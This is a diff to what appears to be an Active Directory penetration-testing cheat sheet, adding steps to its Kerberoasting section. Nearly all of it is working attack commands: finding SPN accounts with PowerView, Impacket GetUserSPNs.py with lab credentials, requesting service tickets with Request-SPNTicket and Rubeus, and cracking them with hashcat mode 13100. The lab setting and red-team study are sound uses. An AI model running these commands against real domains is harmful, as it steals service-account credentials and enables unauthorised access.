@@ -635,7 +635,7 @@ Get-ADUser -LdapFilter "(&(objectclass=user)(objectcategory=user)(useraccountcon
 ## 6.2 Kerberoasting
 
 ```powershell
-
+#Step 1: Find kerberoastable accounts (SPNs)
 # 1. powerview
 Invoke-Kerberoast -OutputFormat Hashcat | % {$_.hash} | Out-File -Encoding ascii hash.txt
 
@@ -644,6 +644,16 @@ Get-ADUser -LDAPFilter "(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt
 
 # 3. Impacket’s GetUserSPNs.py
 GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/hodor:hodor -outputfile kerberoasting.hashes
+
+# Step 2: Request service tickets (TGS)
+# option a
+Request-SPNTicket -SPN "MSSQLSvc/server.domain.local:1433" -Format Hashcat | 
+    Out-File -Append -Encoding ASCII kerberoast.hashes
+#option b
+Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast.hashes
+
+# Step 3: Crack with Hashcat
+hashcat -m 13100 -a 0 kerberoast.hashes wordlist.txt
 
 ```
 ### TIPS:
